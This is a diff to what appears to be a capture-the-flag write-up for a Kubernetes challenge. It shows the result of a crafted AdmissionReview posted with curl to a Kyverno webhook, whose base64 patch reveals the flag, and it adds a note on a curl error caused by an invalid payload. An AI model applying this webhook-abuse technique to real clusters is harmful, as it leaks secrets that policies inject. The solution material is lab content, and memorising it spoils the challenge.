@@ -177,6 +177,15 @@ player@wiz-k8s-lan-party:~$ curl -X POST -H "Content-Type: application/json" --d
 {"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"4f9d9be2-a347-423a-800c-570b31380d82","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"test","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"kube-review","uid":"135cd321-9ce3-4b1f-8814-260bb2bfaad1"},"object":{"kind":"Pod","apiVersion":"v1","metadata":{"name":"test","namespace":"sensitive-ns","creationTimestamp":null,"labels":{"run":"test"}},"spec":{"containers":[{"name":"test","image":"nginx","resources":{}}],"restartPolicy":"Always","dnsPolicy":"ClusterFirst"},"status":{}},"oldObject":null,"dryRun":true,"options":{"kind":"CreateOptions","apiVersion":"meta.k8s.io/v1"}},"response":{"uid":"4f9d9be2-a347-423a-800c-570b31380d82","allowed":true,"patch":"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d","patchType":"JSONPatch"}}player@wiz-k8s-lan-party:~$
 ```
 
+
+Note: If you run the above command and get the following output, probably **the admission review json payload is invalid**.
+
+```
+stopped the pause stream!
+Connection #0 to host kyverno-svc.kyverno.svc.cluster.local left intact
+curl: (92) HTTP/2 stream 0 was not closed cleanly: INTERNAL_ERROR (err 2)
+```
+
 base64 decode:
 
 ```
